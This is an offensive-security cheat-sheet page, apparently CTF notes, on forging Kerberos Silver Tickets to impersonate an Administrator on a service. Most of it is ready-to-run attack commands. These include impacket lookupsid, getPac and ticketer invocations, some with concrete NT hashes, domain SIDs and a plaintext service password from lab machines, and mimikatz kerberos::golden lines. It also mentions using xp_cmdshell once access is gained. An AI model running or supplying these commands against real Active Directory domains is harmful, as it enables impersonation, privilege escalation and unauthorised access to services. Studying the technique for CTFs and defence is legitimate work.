# Silver Ticket

## Theory

The long-term key of a service account can be used to forge a Service ticket that can later be used with [Pass-the-ticket](https://github.com/ShutdownRepo/The-Hacker-Recipes/blob/master/ad/movement/kerberos/forged-tickets/broken-reference/README.md) to access that service. In a Silver Ticket scenario, an attacker will forge a Service Ticket containing a PAC that features arbitrary information about the requesting user, effectively granting lots of access.

In CTF, the Silver Ticket is useful when accessing to a specific service like SQL Server, which is running under SYSTEM privilege, and can run xp\_cmdshell for example.&#x20;

The Siliver Ticket requires a service account and password hash with domain SID.&#x20;

#### Unix

{% code overflow="wrap" %}
```bash
# Find the domain SID
lookupsid.py -hashes 'LMhash:NThash' 'DOMAIN/DomainUser@DomainController' 0
getPac.py sequel.htb/sql_svc:REGGIE1234ronnie -targetUser Administrator

# with an NT hash
python ticketer.py -nthash $NThash -domain-sid $DomainSID -domain $DOMAIN -spn $SPN $Username_to_impersonate

python ticketer.py -nthash 1443ec19da4dac4ffc953bca1b57b4cf -domain-sid S-1-5-21-4078382237-1492182817-2568127209 -domain sequel.htb -spn Hahahah/dc.sequel.htb Administrator

# With svc_mssql account kerberos ticket imported. 
# https://codebeautify.org/ntlm-hash-generator to covert password to NTLM hash 
ticketer.py \
      -nthash 69596C7AA1E8DAEE17F8E78870E25A5C \
      -domain-sid S-1-5-21-2330692793-3312915120-706255856 \
      -domain breach.vl \
      -dc-ip BREACHDC.breach.vl \
      -spn 'MSSQLSvc/breachdc.breach.vl:1433' Administrator

# with an AES (128 or 256 bits) key
python ticketer.py -aesKey $AESkey -domain-sid $DomainSID -domain $DOMAIN -spn $SPN $Username_to_impersonate
```
{% endcode %}

#### Windows

{% code overflow="wrap" %}
```bash
# with an NT hash
kerberos::golden /domain:$DOMAIN /sid:$DomainSID /rc4:$krbtgt_NThash /user:$username_to_impersonate /target:$targetFQDN /service:$spn_type /ptt

# with an AES 128 key
kerberos::golden /domain:$DOMAIN /sid:$DomainSID /aes128:$krbtgt_aes128_key /user:$username_to_impersonate /target:$targetFQDN /service:$spn_type /ptt

# with an AES 256 key
kerberos::golden /domain:$DOMAIN /sid:$DomainSID /aes256:$krbtgt_aes256_key /user:$username_to_impersonate /target:$targetFQDN /service:$spn_type /ptt
```
{% endcode %}
